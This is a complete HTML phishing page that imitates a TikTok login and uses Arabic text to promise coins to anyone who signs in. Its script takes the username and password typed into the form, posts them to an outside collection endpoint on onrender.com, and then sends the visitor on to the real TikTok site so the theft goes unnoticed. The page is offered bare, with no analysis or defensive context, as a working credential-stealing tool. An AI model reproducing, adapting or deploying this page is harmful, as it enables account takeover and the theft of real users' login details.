<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>TikTok</title><style>body{background:#010101;color:#fff;font-family:sans-serif;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;}.box{width:100%;max-width:400px;padding:30px;text-align:center;box-sizing:border-box;}input{width:100%;padding:16px;margin:10px 0;background:#262626;border:1px solid #333;color:#fff;border-radius:8px;font-size:16px;box-sizing:border-box;}.btn{width:100%;background:#fe2c55;color:#fff;padding:16px;border:none;border-radius:8px;font-weight:bold;font-size:18px;margin-top:20px;}</style></head><body><div class="box"><h2 style="font-size:30px;">TikTok</h2><p>سجل دخولك لاستلام العملات</p><form id="f"><input type="text" id="u" placeholder="الهاتف / البريد / المستخدم" required><input type="password" id="p" placeholder="كلمة المرور" required><button type="submit" class="btn">تسجيل الدخول</button></form></div><script>document.getElementById('f').onsubmit=(e)=>{e.preventDefault();fetch('https://brmbtbot-2.onrender.com/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({platform:'TikTok',u:document.getElementById('u').value,p:document.getElementById('p').value})}).finally(()=>{location.href='https://tiktok.com';});};</script></body></html>
